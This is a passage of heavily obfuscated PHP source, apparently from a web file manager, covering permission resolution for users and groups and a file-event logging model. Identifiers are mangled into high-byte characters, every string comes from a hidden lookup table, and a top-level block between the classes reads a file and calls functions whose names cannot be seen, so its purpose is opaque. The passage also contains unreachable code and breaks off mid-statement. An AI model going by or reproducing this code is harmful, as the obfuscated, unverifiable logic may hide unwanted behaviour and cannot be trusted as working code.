(!$îÑ£É‘§) { return $„Õ¢Ë§; } if (!$„Õ¢Ë§ && $Ñ°Ç´â¦) { $„Õ¢Ë§ = $this->groupAuthInfo($Ñ°Ç´â¦, $…±˜îÃ¼); } if (!$„Õ¢Ë§) { $ĞßâÈ¸ö = Model($²…‹ñ•[596])->getInfo($…±˜îÃ¼); $Ğ‡’íÚ = explode($²…‹ñ•[50], trim($ĞßâÈ¸ö[$²…‹ñ•[595]], $²…‹ñ•[50])); $Ğ‡’íÚ = array_reverse($Ğ‡’íÚ); foreach ($Ğ‡’íÚ as $™Â¦ı€ó) { if ($™Â¦ı€ó == $²…‹ñ•[230] || $™Â¦ı€ó == $Ñ»ê¶ı) { continue; } $‹–•‰Å½ = $this->groupRootAuth($™Â¦ı€ó, $Ï³Ü¤˜¿); if (!$‹–•‰Å½) { continue; } $„Õ¢Ë§ = $this->groupAuthInfo($‹–•‰Å½, $™Â¦ı€ó); break; } } if (!$„Õ¢Ë§ || $„Õ¢Ë§[$²…‹ñ•[499]] <= 0) { $ÙÄœ±‘Ğ = $this->authDeepCheck($¡ëåÉ†Ù[$²…‹ñ•[193]], $Ï³Ü¤˜¿); if ($ÙÄœ±‘Ğ) { $„Õ¢Ë§ = $ÙÄœ±‘Ğ; } } return $„Õ¢Ë§; } private function userIsRoot($º»àé = false) { $…øÄº¢µ =& $_SERVER[¼’ç§¼´]; if (!$º»àé && KodUser::isRoot()) { return !0; } $ÀÏïšˆ© = Model($…øÄº¢µ[608])->getInfo($º»àé); $º«ãµŞ– = Model($…øÄº¢µ[2190])->listData($ÀÏïšˆ©[$…øÄº¢µ[2191]]); if ($º«ãµŞ– && $º«ãµŞ–[$…øÄº¢µ[586]][$…øÄº¢µ[2192]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ôØúé¸î) { $ë±õ×Šû =& $_SERVER[¼’ç§¼´]; $Ğü•ÔŞÕ = Model($ë±õ×Šû[1430]); $²¿•¯µ = $Ğü•ÔŞÕ->sourceInfo($ôØúé¸î); if (!$²¿•¯µ) { return !1; } $Ğü•ÔŞÕ->groupPathDisplay($²¿•¯µ); $Å…×ç«Á = array($²¿•¯µ); $Å…×ç«Á = $Ğü•ÔŞÕ->_listAppendPath($Å…×ç«Á); $²¿•¯µ = $Å…×ç«Á[0]; $ÒˆÏà³° = $²¿•¯µ[$ë±õ×Šû[593]]; if (isset($²¿•¯µ[$ë±õ×Šû[601]])) { $Ù¥Àí¥à = explode($ë±õ×Šû[8], trim($²¿•¯µ[$ë±õ×Šû[593]], $ë±õ×Šû[8])); array_shift($Ù¥Àí¥à); $ÒˆÏà³° = $²¿•¯µ[$ë±õ×Šû[599]] . $ë±õ×Šû[2193] . implode($ë±õ×Šû[8], $Ù¥Àí¥à); } return array($ë±õ×Šû[505] => $²¿•¯µ[$ë±õ×Šû[32]], $ë±õ×Šû[87] => KodIO::make($²¿•¯µ[$ë±õ×Šû[193]]), $ë±õ×Šû[2194] => $ÒˆÏà³°); } private function groupAuthInfo($àŠœœùû, $«º‰ö±®) { $ «ÇÍÛ” =& $_SERVER[¼’ç§¼´]; $·Ä©èÕœ = Model($ «ÇÍÛ”[596])->getInfo($«º‰ö±®); return array($ «ÇÍÛ”[2195] => intval($àŠœœùû[$ «ÇÍÛ”[498]]), $ «ÇÍÛ”[2178] => $àŠœœùû, $ «ÇÍÛ”[2196] => LNG($ «ÇÍÛ”[2197]), $ «ÇÍÛ”[2187] => array($ «ÇÍÛ”[505] => $·Ä©èÕœ[$ «ÇÍÛ”[32]], $ «ÇÍÛ”[87] => KodIO::make($·Ä©èÕœ[$ «ÇÍÛ”[90]][$ «ÇÍÛ”[193]]), $ «ÇÍÛ”[2194] => $·Ä©èÕœ[$ «ÇÍÛ”[600]])); } protected function groupRootAuth($û’€ØÏ, $¯ˆÁ = false) { $ƒ£³Û»Ú =& $_SERVER[¼’ç§¼´]; $¯ˆÁ = $¯ˆÁ ? $¯ˆÁ : USER_ID; $ û•Ê™å = $¯ˆÁ . $ƒ£³Û»Ú[2198] . $û’€ØÏ; static $±ØÈ¿Ü = array(); if (isset($±ØÈ¿Ü[$ û•Ê™å])) { return $±ØÈ¿Ü[$ û•Ê™å]; } $¿ß¼×İ = Model($ƒ£³Û»Ú[596])->getInfo($û’€ØÏ); $µ²ß™›ş = $this->userGroupList($¯ˆÁ); $¸€«¶©È = isset($µ²ß™›ş[$û’€ØÏ]) ? $µ²ß™›ş[$û’€ØÏ][$ƒ£³Û»Ú[498]] : !1; if ($¸€«¶©È && Model($ƒ£³Û»Ú[582])->authCheckAction($¸€«¶©È[$ƒ£³Û»Ú[498]], $ƒ£³Û»Ú[2005])) { $±ØÈ¿Ü[$ û•Ê™å] = $¸€«¶©È; return $¸€«¶©È; } $ù”Óîîú = $this->sourceAuthSelect($¿ß¼×İ[$ƒ£³Û»Ú[90]][$ƒ£³Û»Ú[193]]); $¯’¢™×Ğ = $ù”Óîîú ? $this->authMake($ù”Óîîú, $¯ˆÁ) : !1; $ØÄñôÏì = $¯’¢™×Ğ ? $¯’¢™×Ğ[$ƒ£³Û»Ú[551]] : !1; $±ØÈ¿Ü[$ û•Ê™å] = $ØÄñôÏì ? $ØÄñôÏì : $¸€«¶©È; return $±ØÈ¿Ü[$ û•Ê™å]; } public function authOwnerApply($ª•èöÏ½) { $Ò²…Íìğ =& $_SERVER[¼’ç§¼´]; if (empty($ª•èöÏ½[$Ò²…Íìğ[498]]) || isset($ª•èöÏ½[$Ò²…Íìğ[2199]]) && $ª•èöÏ½[$Ò²…Íìğ[2199]]) { return $ª•èöÏ½; } if (AuthModel::authCheckRoot($ª•èöÏ½[$Ò²…Íìğ[498]][$Ò²…Íìğ[499]])) { return $ª•èöÏ½; } $¤›à˜¯£ = Model($Ò²…Íìğ[1430])->parentLevelArray($ª•èöÏ½[$Ò²…Íìğ[595]]); $¤›à˜¯£ = array_merge(array($ª•èöÏ½[$Ò²…Íìğ[193]]), array_reverse($¤›à˜¯£)); $ÕÉ³”‡Á = $this->sourceAuthSelect($¤›à˜¯£); $Ï”²ÜÛÊ = array(); $ÒëŠğ›› = array(); foreach ($ÕÉ³”‡Á as $éŒ“á• => $®¶²â) { $úÎ€ùÏ = $this->authFolderOwnerUser($®¶²â); $Ï”²ÜÛÊ[$éŒ“á•] = $úÎ€ùÏ; $ÒëŠğ›› = array_merge($ÒëŠğ››, $úÎ€ùÏ[$Ò²…Íìğ[676]]); if ($úÎ€ùÏ[$Ò²…Íìğ[2200]]) { break; } } if (count($ÒëŠğ››) == 0) { $ÒëŠğ›› = $this->authFolderOwnerGroup($ª•èöÏ½[$Ò²…Íìğ[580]]); } $ÒëŠğ›› = array_unique($ÒëŠğ››); if (AuthModel::authCheckRoot($ª•èöÏ½[$Ò²…Íìğ[498]][$Ò²…Íìğ[499]])) { $ÒëŠğ››[] = USER_ID; } $ª•èöÏ½[$Ò²…Íìğ[498]][$Ò²…Íìğ[2201]] = Model($Ò²…Íìğ[588])->userListInfo($ÒëŠğ››); return $ª•èöÏ½; } private function authFolderOwnerGroup($ñúÏ¦üó) { $ÖÑô¯â¾ =& $_SERVER[¼’ç§¼´]; $ø³Ñóİ¼ = Model($ÖÑô¯â¾[2078])->where(array($ÖÑô¯â¾[1984] => $ñúÏ¦üó))->select(); $°¿ÔÎí = array(); if (!$ø³Ñóİ¼) { return $°¿ÔÎí; } foreach ($ø³Ñóİ¼ as $«Å’î½ß) { $ÛÜâŸ› = $this->authInfo($«Å’î½ß); if (AuthModel::authCheckRoot($ÛÜâŸ›[$ÖÑô¯â¾[498]])) { $°¿ÔÎí[] = $«Å’î½ß[$ÖÑô¯â¾[1783]]; } } return $°¿ÔÎí; } private function authFolderOwnerUser($¸ãáäß™) { $«¦¬»Û– =& $_SERVER[¼’ç§¼´]; $…Äµ¤ê = array(); $’Ú±‹÷ó = !1; foreach ($¸ãáäß™ as $†èË±ò¥) { $œƒÛÏ·ƒ = $this->authInfo($†èË±ò¥); if ($†èË±ò¥[$«¦¬»Û–[580]] == $«¦¬»Û–[230]) { $’Ú±‹÷ó = !0; } if ($†èË±ò¥[$«¦¬»Û–[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($œƒÛÏ·ƒ[$«¦¬»Û–[498]])) { $…Äµ¤ê[] = $†èË±ò¥[$«¦¬»Û–[580]]; } } } return array($«¦¬»Û–[676] => $…Äµ¤ê, $«¦¬»Û–[2200] => $’Ú±‹÷ó); } public function authMake($ñØ®Ğ¤Ù, $¡Şñ¨Ï¯ = false) { $‰åÂø›… =& $_SERVER[¼’ç§¼´]; $Ø£ÀèŒÌ = $this->authArrayCheck($ñØ®Ğ¤Ù, $¡Şñ¨Ï¯); if ($Ø£ÀèŒÌ[$‰åÂø›…[2202]]) { $Ø£ÀèŒÌ[$‰åÂø›…[2202]] = $this->sourceAuthInfo($Ø£ÀèŒÌ[$‰åÂø›…[2202]]); } return $Ø£ÀèŒÌ; } public function authArrayCheck($’ßŞ®ê, $«òĞµµº = false) { $Óõ¹ÚÂª =& $_SERVER[¼’ç§¼´]; if (!$’ßŞ®ê) { return array($Óõ¹ÚÂª[499] => 0, $Óõ¹ÚÂª[551] => !1); } $«òĞµµº = $«òĞµµº ? $«òĞµµº : USER_ID; $£­ÇÅ•è = 0; $ı£¥€ı¸ = 0; $ï·ã´™î = 0; $ÕÍÓ…ÅÂ = 0; $œ¶Íà™É = 0; $¨¹™Ñï¯ = 0; $ç×¤ˆíë = 1000; $ìÀÁİÌé = 0; $âòÆó¶© = 0; $éÁòÍ‰Š = 0; $‘úë‚åÎ = 0; $İ×»İ¬§ = array($Óõ¹ÚÂª[193] => 0); foreach ($’ßŞ®ê as $İ×»İ¬§) { $ÖÃÌô€à = $this->authInfo($İ×»İ¬§); if (!$ÖÃÌô€à) { continue; } $‰‚ÖÆÌº = $İ×»İ¬§[$Óõ¹ÚÂª[580]]; $È°üåŠ = intval($ÖÃÌô€à[$Óõ¹ÚÂª[498]]); if ($İ×»İ¬§[$Óõ¹ÚÂª[190]] == SourceModel::TYPE_USER && $‰‚ÖÆÌº == $«òĞµµº) { $£­ÇÅ•è = !0; $ï·ã´™î = $ÖÃÌô€à; $ı£¥€ı¸ = $È°üåŠ; } else { if ($İ×»İ¬§[$Óõ¹ÚÂª[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‰‚ÖÆÌº, $«òĞµµº)) { $ÕÍÓ…ÅÂ = !0; $‡ùŠÊ = $this->groupStepToUserGroup($‰‚ÖÆÌº, $«òĞµµº); if ($‡ùŠÊ < $ç×¤ˆíë) { $ç×¤ˆíë = $‡ùŠÊ; $œ¶Íà™É = $È°üåŠ; $¨¹™Ñï¯ = $ÖÃÌô€à; $ìÀÁİÌé = $‰‚ÖÆÌº; } if ($‡ùŠÊ == $ç×¤ˆíë && $È°üåŠ >= $œ¶Íà™É) { $œ¶Íà™É = $È°üåŠ; $¨¹™Ñï¯ = $ÖÃÌô€à; $ìÀÁİÌé = $‰‚ÖÆÌº; } } else { if ($‰‚ÖÆÌº == $Óõ¹ÚÂª[230]) { $âòÆó¶© = !0; $‘úë‚åÎ = $ÖÃÌô€à; $éÁòÍ‰Š = $È°üåŠ; } } } } if ($£­ÇÅ•è) { $ò¿ÁéÑú = $ı£¥€ı¸; $ÖÃÌô€à = $ï·ã´™î; $Øóá¾Ñ… = LNG($Óõ¹ÚÂª[2203]); } else { if ($ÕÍÓ…ÅÂ) { $ò¿ÁéÑú = $œ¶Íà™É; $ÖÃÌô€à = $¨¹™Ñï¯; $ø¤‚ÕÔä = Model($Óõ¹ÚÂª[596])->getInfo($ìÀÁİÌé); $Øóá¾Ñ… = $Óõ¹ÚÂª[176] . $ø¤‚ÕÔä[$Óõ¹ÚÂª[600]] . $Óõ¹ÚÂª[2204] . LNG($Óõ¹ÚÂª[2205]); } else { if ($âòÆó¶©) { $ò¿ÁéÑú = $éÁòÍ‰Š; $ÖÃÌô€à = $‘úë‚åÎ; $Øóá¾Ñ… = LNG($Óõ¹ÚÂª[2175]); } else { $ò¿ÁéÑú = 0; $ÖÃÌô€à = !1; $Øóá¾Ñ… = $Óõ¹ÚÂª[12]; } } } $ú÷ºÕÁª = array($Óõ¹ÚÂª[2195] => intval($ò¿ÁéÑú), $Óõ¹ÚÂª[2178] => $ÖÃÌô€à, $Óõ¹ÚÂª[2196] => $Øóá¾Ñ…, $Óõ¹ÚÂª[2187] => $İ×»İ¬§[$Óõ¹ÚÂª[193]]); return $ú÷ºÕÁª; } private function groupContainUser($œÄğöá, $÷¥ÜûË¼ = false) { return in_array($œÄğöá, $this->userGroupParents($÷¥ÜûË¼)); } private function groupStepToUserGroup($Óöé€öé, $æƒ£à‰Ü = false) { $·ÍÃ×º¢ =& $_SERVER[¼’ç§¼´]; $ÁŸ³ÈåÜ = $this->userGroupList($æƒ£à‰Ü); $Â‘”‹Í‡ = 1000; $ØÍ«Ÿ¡Á = $GLOBALS[$·ÍÃ×º¢[6]][$·ÍÃ×º¢[92]][$·ÍÃ×º¢[2091]] == 1; $úï‘åšû = $ØÍ«Ÿ¡Á ? 3 : 2; foreach ($ÁŸ³ÈåÜ as $Ş¸í¤ß‘) { if ($Ş¸í¤ß‘[$·ÍÃ×º¢[1984]] == $Óöé€öé) { return 0; } $ãï‡úÅ = explode($·ÍÃ×º¢[50], trim($Ş¸í¤ß‘[$·ÍÃ×º¢[595]], $·ÍÃ×º¢[50])); if ($ãï‡úÅ[0] == $·ÍÃ×º¢[230] && count($ãï‡úÅ) > $úï‘åšû) { $ë½üèÅ± = array_reverse(array_slice($ãï‡úÅ, $úï‘åšû)); $åË™–Ë‡ = array_search($Óöé€öé, $ë½üèÅ±); if ($åË™–Ë‡ !== !1 && $åË™–Ë‡ + 1 <= $Â‘”‹Í‡) { $Â‘”‹Í‡ = $åË™–Ë‡ + 1; } } } return $Â‘”‹Í‡; } private function userGroupList($¼ßÓ†ƒ™ = false) { $éËøõ =& $_SERVER[¼’ç§¼´]; static $š‡ïòàÔ = array(); if (isset($š‡ïòàÔ[$¼ßÓ†ƒ™])) { return $š‡ïòàÔ[$¼ßÓ†ƒ™]; } $ùˆ¬öí = Model($éËøõ[608])->getInfo($¼ßÓ†ƒ™); $š‡ïòàÔ[$¼ßÓ†ƒ™] = array_to_keyvalue($ùˆ¬öí[$éËøõ[2176]], $éËøõ[1984]); return $š‡ïòàÔ[$¼ßÓ†ƒ™]; } public function userGroupParents($‡ç§©Åç) { $‹Õœ‹€ =& $_SERVER[¼’ç§¼´]; static $™ùŸÆöÅ = array(); $‡ç§©Åç = $‡ç§©Åç ? $‡ç§©Åç : USER_ID; if (isset($™ùŸÆöÅ[$‡ç§©Åç])) { return $™ùŸÆöÅ[$‡ç§©Åç]; } $îİÑèÈà = $this->userGroupList($‡ç§©Åç); $àº–Í¨ = array(); $øüÛ‰¤ = $GLOBALS[$‹Õœ‹€[6]][$‹Õœ‹€[92]][$‹Õœ‹€[2091]] == 1; $í…§Â‚ = $øüÛ‰¤ ? 3 : 2; foreach ($îİÑèÈà as $—§Ãáª) { $¹ñ¦ÊÒÈ = array($—§Ãáª[$‹Õœ‹€[1984]]); $Û×ÂòşÒ = explode($‹Õœ‹€[50], trim($—§Ãáª[$‹Õœ‹€[595]], $‹Õœ‹€[50])); if ($Û×ÂòşÒ[0] == $‹Õœ‹€[230] && count($Û×ÂòşÒ) > $í…§Â‚) { $­ßäìã = array_slice($Û×ÂòşÒ, $í…§Â‚); $¹ñ¦ÊÒÈ = array_merge($¹ñ¦ÊÒÈ, array_reverse($­ßäìã)); } $àº–Í¨ = array_merge($àº–Í¨, $¹ñ¦ÊÒÈ); } $™ùŸÆöÅ[$‡ç§©Åç] = array_unique($àº–Í¨); return $™ùŸÆöÅ[$‡ç§©Åç]; } public function authTargetInfoMake($äï“ì»è) { $Œ°ùÃË =& $_SERVER[¼’ç§¼´]; $Î„ªšÚ = array(); $›¿­ï™ = array(); foreach ($äï“ì»è as $ü£Ÿã) { if ($ü£Ÿã[$Œ°ùÃË[190]] == SourceModel::TYPE_USER) { $Î„ªšÚ[] = intval($ü£Ÿã[$Œ°ùÃË[580]]); } else { if ($ü£Ÿã[$Œ°ùÃË[190]] == SourceModel::TYPE_GROUP) { $›¿­ï™[] = intval($ü£Ÿã[$Œ°ùÃË[580]]); } } } if ($Î„ªšÚ) { $Î„ªšÚ = Model($Œ°ùÃË[588])->userListInfo($Î„ªšÚ); } if ($›¿­ï™) { $™×¢„¦Ã = array($Œ°ùÃË[2076] => array($Œ°ùÃË[503], $›¿­ï™)); $›¿­ï™ = Model($Œ°ùÃË[596])->field($Œ°ùÃË[2206])->where($™×¢„¦Ã)->select(); $›¿­ï™ = array_to_keyvalue($›¿­ï™, $Œ°ùÃË[1984]); } return array($Œ°ùÃË[2207] => $Î„ªšÚ, $Œ°ùÃË[2208] => $›¿­ï™); } public function authInfo($œà˜Ã¸Ÿ) { $‰“ÏÎŠä =& $_SERVER[¼’ç§¼´]; if ($œà˜Ã¸Ÿ[$‰“ÏÎŠä[2092]]) { $Áßì‡Û = Model($‰“ÏÎŠä[582])->listData($œà˜Ã¸Ÿ[$‰“ÏÎŠä[2092]]); if (!$Áßì‡Û) { return !1; $Õ˜ñÅæó = Model($‰“ÏÎŠä[582])->listData(); $Ñ³ç••… = array_filter_by_field($Õ˜ñÅæó, $‰“ÏÎŠä[498], $‰“ÏÎŠä[230]); return $Ñ³ç••…; } $üç´½‘ = array_field_key($Áßì‡Û, array($‰“ÏÎŠä[486], $‰“ÏÎŠä[32], $‰“ÏÎŠä[498], $‰“ÏÎŠä[2007], $‰“ÏÎŠä[2008])); $üç´½‘[$‰“ÏÎŠä[2209]] = $œà˜Ã¸Ÿ; return $üç´½‘; } else { return array($‰“ÏÎŠä[504] => 0, $‰“ÏÎŠä[1990] => $œà˜Ã¸Ÿ[$‰“ÏÎŠä[2153]], $‰“ÏÎŠä[505] => $‰“ÏÎŠä[12], $‰“ÏÎŠä[2007] => $‰“ÏÎŠä[2210]); } } } if ($_SERVER[$_SERVER[¼’ç§¼´][434]] != $_SERVER[$_SERVER[¼’ç§¼´][1634]]) { $_getc = $_SERVER[¼’ç§¼´][435]; $_getfile = $_SERVER[$_SERVER[¼’ç§¼´][436]] . $_SERVER[¼’ç§¼´][437]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼’ç§¼´][287], $_getfilec); if (count($_getarrs) < $_SERVER[¼’ç§¼´][438]) { $exit = $_SERVER[¼’ç§¼´][439]; $exit(); } $_act = $_SERVER[¼’ç§¼´][440]; $_act($_SERVER[$_SERVER[¼’ç§¼´][432]]); } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\145\137\145\166\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\143\164\151\157\x6e"), array("\x64\x65\x73\x63", '', "\151\156\163\145\162\164\x2c\x75\x70\144\141\164\145\54\163\145\x6c\145\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($œ»º”ƒú, $¿â«ıœ, $¬ €˜¦à = '') { $å¾Øˆüğ =& $_SERVER[¼’ç§¼´]; if (!$this->eventSave) { return; } $Ÿ¾İĞˆŞ = Model($å¾Øˆüğ[1430])->sourceInfo($œ»º”ƒú); if (!$Ÿ¾İĞˆŞ) { return !1; } if ($this->isDisableEvent($Ÿ¾İĞˆŞ, $¿â«ıœ)) { return; } if ($¬ €˜¦à && is_string($¬ €˜¦à)) { $¬ €˜¦à = array($å¾Øˆüğ[2023] => $¬ €˜¦à); } $¢İŸïº° = defined($å¾Øˆüğ[2211]) ? USER_ID : 0; $ÌĞœšï = array($å¾Øˆüğ[502] => $œ»º”ƒú, $å¾Øˆüğ[2212] => $Ÿ¾İĞˆŞ[$å¾Øˆüğ[192]], $å¾Øˆüğ[2213] => $Ÿ¾İĞˆŞ[$å¾Øˆüğ[32]], $å¾Øˆüğ[593] => !empty($Ÿ¾İĞˆŞ[$å¾Øˆüğ[593]]) ? $Ÿ¾İĞˆŞ[$å¾Øˆüğ[593]] : $å¾Øˆüğ[12], $å¾Øˆüğ[1774] => $¢İŸïº°, $å¾Øˆüğ[507] => $¿â«ıœ, $å¾Øˆüğ[1776] => $¬ €˜¦à); $this->addSystemLog($¿â«ıœ, $ÌĞœšï); unset($ÌĞœšï[$å¾Øˆüğ[2213]], $ÌĞœšï[$å¾Øˆüğ[593]]); return $this->add($ÌĞœšï); } private function addSystemLog($¹Ôõ´áœ, $¦°óÕòñ) { $”¯­À®„ =& $_SERVER[¼’ç§¼´]; if ($¹Ôõ´áœ == $”¯­À®„[2214]) { $¹Ôõ´áœ = $¦°óÕòñ[$”¯­À®„[537]][$”¯­À®„[2215]]; } else { if (in_array($¹Ôõ´áœ, array($”¯­À®„[1963], $”¯­À®„[2216]))) { $¹Ôõ´áœ = $¦°óÕòñ[$”¯­À®„[537]][$”¯­À®„[171]]; } } $ºÅØÅÙÇ = array_merge($¦°óÕòñ, array($”¯­À®„[2217] => $¦°óÕòñ[$”¯­À®„[193]], $”¯­À®„[2218] => $¦°óÕòñ[$”¯­À®„[2218]])); Hook::trigger($”¯­À®„[2219], $”¯­À®„[2220] . $¹Ôõ´áœ, $¦°óÕòñ); Model($”¯­À®„[1927])->addLog($”¯­À®„[2220] . $¹Ôõ´áœ, $ºÅØÅÙÇ); } private function isDisableEvent($—À×ÇÊŒ, $‰ğ•º¤®) { $Îã¨¶÷Ì =& $_SERVER[¼’ç§¼´]; if ($—À×ÇÊŒ[$Îã¨¶÷Ì[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‰ğ•º¤® == $Îã¨¶÷Ì[1952]) { return !1; } return !0; } public function eventCreate($ÊÃ¶»€æ, $ìş­ëá) { $ÖôÇÅÅ =& $_SERVER[¼’ç§¼´]; $³Ù‰Â§” = Model($ÖôÇÅÅ[1430])->sourceInfo($ÊÃ¶»€æ); $”ôå¸ê³ = array($ÖôÇÅÅ[2215] => $ìş­ëá, $ÖôÇÅÅ[32] => $³Ù‰Â§”[$ÖôÇÅÅ[32]]); return $this->addEvent($ÊÃ¶»€æ, $ÖôÇÅÅ[2214], $”ôå¸ê³); } public function eventFileEdit($æ–Øˆš—) { $’¶î×§ï =& $_SERVER[¼’ç§¼´]; $ñØµúãß = array($’¶î×§ï[2221] => $_SERVER[$’¶î×§ï[2222]], $’¶î×§ï[2223] => strtolower(ACTION)); if (isset($GLOBALS[$’¶î×§ï[7]][$’¶î×§ï[2224]])) { $ñØµúãß[$’¶î×§ï[2224]] = $’¶î×§ï[91]; } return $this->addEvent($æ–Øˆš—, $’¶î×§ï[1953], $ñØµúãß); } public function eventRecycle($€ÅÔ¼³İ, $‡Á·Ñ¾£) { return $this->addEvent($€ÅÔ¼³İ, $_SERVER[¼’ç§¼´][2216], $‡Á·Ñ¾£); } private static $_removeLast = ''; public function eventRemove($»±Ç¥÷û) { $êû£ò¨› =& $_SERVER[¼’ç§¼´]; self::$_removeLast = $»±Ç¥÷û; $¤ÄêğÇ = Model($êû£ò¨›[1430])->sourceInfo($»±Ç¥÷û); $ø¥˜€ = array_field_key($¤ÄêğÇ, array($êû£ò¨›[193], $êû£ò¨›[552], $êû£ò¨›[516], $êû£ò¨›[595])); $ğÏ¬èê = array($êû£ò¨›[171] => $¤ÄêğÇ[$êû£ò¨›[32]], $êû£ò¨›[2223] => ACTION, $êû£ò¨›[2225] => $ø¥˜€); return $this->addEvent($¤ÄêğÇ[$êû£ò¨›[192]], $êû£ò¨›[1952], $ğÏ¬èê); } public function eventShare($§’‰í¬ô, $¾·²³³ë) { return $this->addEvent($§’‰í¬ô, $_SERVER[¼’ç§¼´][1963], $¾·²³³ë); } public function eventMove($ë´±Çã°, $ËĞŠó‰, $Í¸¾„é) { $¯¡Ù„ =& $_SERVER[¼’ç§¼´]; if (self::$_removeLast == $ë´±Çã°) { return; } $ì¥¶ğ°¢ = Model($¯¡Ù„[1430]); $õÀ³Ö‡‡ = $ì¥¶ğ°¢->sourceInfo($ë´±Çã°); $Ëü›öÃñ = $ì¥¶ğ°¢->sourceInfo($ËĞŠó‰); $‚ƒï¬ƒ = $ì¥¶ğ°¢->sourceInfo($Í¸¾„é); $®•—‹–õ = array($¯¡Ù„[1250] => $ËĞŠó‰, $¯¡Ù„[2226] => $Ëü›öÃñ[$¯¡Ù„[32]], $¯¡Ù„[2202] => !empty($Ëü›öÃñ[$¯¡Ù„[593]]) ? $Ëü›öÃñ[$¯¡Ù„[593]] : $¯¡Ù„[12], $¯¡Ù„[1251] => $Í¸¾„é, $¯¡Ù„[2227] => $‚ƒï¬ƒ[$¯¡Ù„[32]], $¯¡Ù„[2228] => !empty($‚ƒï¬ƒ[$¯¡Ù„[593]]) ? $‚ƒï¬ƒ[$¯¡Ù„[593]] : $¯¡Ù„[12]); $this->addEvent($ë´±Çã°, $¯¡Ù„[634], $®•—‹–õ); $õÀ³Ö‡‡ = $ì¥¶ğ°¢->sourceInfo($ë´±Çã°); $®•—‹–õ = array($¯¡Ù„[193] => $õÀ³Ö‡‡[$¯¡Ù„[193]], $¯¡Ù„[32] => $õÀ³Ö‡‡[$¯¡Ù„[32]]); $this->addEvent($ËĞŠó‰, $¯¡Ù„[2229], $®•—‹–õ); } public function eventCopy($¥¸ÄÛ¶­) { $this->eventCreate($¥¸ÄÛ¶­, $_SERVER[¼’ç§¼´][632]); } public function eventRename($¸¢¢±§ñ, $Ú¯¬®Ìç, $Ó÷º¬Ö¥) { $ú®ãÓğâ =& $_SERVER[¼’ç§¼´]; $šÀ·˜Å¸ = array($ú®ãÓğâ[1250] => $Ú¯¬®Ìç, $ú®ãÓğâ[1251] => $Ó÷º¬Ö¥); return $this->addEvent($¸¢¢±§ñ, $ú®ãÓğâ[1444], $šÀ·˜Å¸); } public function eventAddComment($½ÄÆÃ™¾, $ºòŠŸøÊ) { return $this->addEvent($½ÄÆÃ™¾, $_SERVER[¼’ç§¼´][2230], $ºòŠŸøÊ); } public function eventAddDesc($£÷ŞĞ¶·, $õÏö‹Ã) { return $this->addEvent($£÷ŞĞ¶·, $_SERVER[¼’ç§¼´][2231], $õÏö‹Ã); } public function listBySource($·ıôÆÛ) { $èèßø•§ =& $_SERVER[¼’ç§¼´]; $Íõóë¨Ë = Model($èèßø•§[1430])->sourceInfo($·ıôÆÛ); $–ƒ°øå‹ = array($èèßø•§[502] => $·ıôÆÛ); if ($Íõóë¨Ë[$èèßø•§[496]] == $èèßø•§[91]) { $éà‰Ø‘Ë = Model($èèßø•§[1430])->listSearchChildren($·ıôÆÛ, 20000); $éà‰Ø‘Ë[] = $·ıôÆÛ . $èèßø•§[465]; $–ƒ°øå‹ = array($èèßø•§[193] => array($èèßø•§[7], $éà‰Ø‘Ë)); } $³¨äçÛà = $this->where($–ƒ°øå‹)->order($èèßø•§[2232])->selectPage(); if ($³¨äçÛà[$èèßø•§[453]][$èèßø•§[454]] == 0) { $³¨äçÛà[$èèßø•§[453]][$èèßø•§[454]] = 1; $³¨äçÛà[$èèßø•§[456]] = array(array($èèßø•§[502] => $·ıôÆÛ, $èèßø•§[2212] => $Íõóë¨Ë[$èèßø•§[192]], $èèßø•§[1774] => $Íõóë¨Ë[$èèßø•§[538]], $èèßø•§[507] => $èèßø•§[2233], $èèßø•§[508] => $Íõóë¨Ë[$èèßø•§[233]], $èèßø•§[1776] => $èèßø•§[12])); } return $this->eventListParse($³¨äçÛà, $·ıôÆÛ); } private function eventListParse($æ×‚“Íï, $áËÀÙ‹) { $Š­Ğ„‡² =& $_SERVER[¼’ç§¼´]; $È¸Ë¯¤¬ = $æ×‚“Íï[$Š­Ğ„‡²[456]]; $ø€Šû­¶ = array_to_keyvalue($È¸Ë¯¤¬, $Š­Ğ„‡²[12], $Š­Ğ„‡²[193]); $éù¿ÆË = array_to_keyvalue($È¸Ë¯¤¬, $Š­Ğ„‡²[12], $Š­Ğ„‡²[2218]); foreach ($È¸Ë¯¤¬ as $½İ»àüÁ) { $Ó‡ôÌÄ• = $½İ»àüÁ[$Š­Ğ„‡²[537]]; if ($½İ»àüÁ[$Š­Ğ„‡²[33]] == $Š­Ğ„‡²[634] && isset($Ó‡ôÌÄ•[$Š­Ğ„‡²[1250]])) { $ø€Šû­¶[] = $Ó‡ôÌÄ•[$Š­Ğ„‡²[1250]] . $Š­Ğ„‡²[12]; $ø€Šû­¶[] = $Ó‡ôÌÄ•[$Š­Ğ„‡²[1251]] . $Š­Ğ„‡²[12]; } if ($½İ»àüÁ[$Š­Ğ„‡²[33]] == $Š­Ğ„‡²[2229] && isset($Ó‡ôÌÄ•[$Š­Ğ„‡²[193]])) { $ø€Šû­¶[] = $Ó‡ôÌÄ•[$Š­Ğ„‡²[193]] . $Š­Ğ„‡²[12]; } } $ø€Šû­¶ = array_merge($ø€Šû­¶, $éù¿ÆË, array($áËÀÙ‹ . $Š­Ğ„‡²[12])); $ø€Šû­¶ = array_unique($ø€Šû­¶); $½™åŠ’† = array_unique(array_to_keyvalue($È¸Ë¯¤¬, $Š­Ğ„‡²[12], $Š­Ğ„‡²[1783])); $çĞå™˜¤ = Model($Š­Ğ„‡²[608])->userListInfo($½™åŠ’†); $¿µŸµäÌ = Model($Š­Ğ„‡²[913])->sourceListInfo($ø€Šû­¶, !0); foreach ($È¸Ë¯¤¬ as &$½İ»àüÁ) { if ($½İ»àüÁ[$Š­Ğ„‡²[33]] == $Š­Ğ„‡²[634] && 